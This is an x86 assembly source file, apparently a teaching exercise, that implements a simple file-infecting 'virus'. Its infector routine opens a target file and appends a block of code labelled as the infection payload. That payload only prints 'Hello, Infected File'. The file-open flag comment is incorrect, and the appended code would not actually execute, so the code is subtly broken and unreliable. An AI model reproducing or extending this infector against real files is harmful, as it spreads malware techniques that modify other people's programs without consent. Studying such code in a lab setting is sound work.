section .text
    global _start
    global system_call
    global infection
    global infector
    extern main
    extern strlen

_start:
    pop dword ecx    ; ecx = argc
    mov esi, esp     ; esi = argv
    mov eax, ecx
    shl eax, 2
    add eax, esi
    add eax, 4
    push dword eax   ; envp
    push dword esi   ; argv
    push dword ecx   ; argc
    call main
    mov ebx, eax
    mov eax, 1
    int 0x80

system_call:
    push ebp
    mov ebp, esp
    sub esp, 4
    pushad
    mov eax, [ebp+8]
    mov ebx, [ebp+12]
    mov ecx, [ebp+16]
    mov edx, [ebp+20]
    int 0x80
    mov [ebp-4], eax
    popad
    mov eax, [ebp-4]
    add esp, 4
    pop ebp
    ret

infection:
    pushad
    mov ebx, 1            ; STDOUT
    mov ecx, virus_msg
    push ecx
    call strlen
    add esp, 4
    mov ecx, virus_msg
    mov edx, eax
    mov eax, 4            ; SYS_WRITE
    int 0x80
    popad
    ret

infector:
    ; print file name
    mov ebx, 1
    mov ecx, [esp + 4]
    push ecx
    call strlen
    pop ecx
    mov edx, eax
    mov eax, 4
    int 0x80

    ; print newline
    mov eax, 4
    mov ebx, 1
    mov ecx, newline
    mov edx, 1
    int 0x80

    ; open file for append
    mov eax, 5
    mov ebx, [esp + 4]
    mov ecx, 0x102        ; O_WRONLY | O_APPEND
    mov edx, 0x1B6        ; mode 0666
    int 0x80
    mov esi, eax          ; save file descriptor

    ; write the virus code from code_start to code_end
    mov eax, 4
    mov ebx, esi
    mov ecx, code_start
    mov edx, code_end - code_start
    int 0x80

    ; close the file
    mov eax, 6
    mov ebx, esi
    int 0x80
    ret

section .data
    newline db 10
    virus_msg db "Hello, Infected File", 10, 0

; 🔥 Real executable payload for infection
code_start:
    ; This code prints: Hello, Infected File\n
    pushad
    mov eax, 4          ; SYS_WRITE
    mov ebx, 1          ; STDOUT
    mov ecx, virus_msg  ; points to message
    push ecx
    call strlen
    add esp, 4
    mov ecx, virus_msg
    mov edx, eax
    int 0x80
    popad
    ret
code_end:
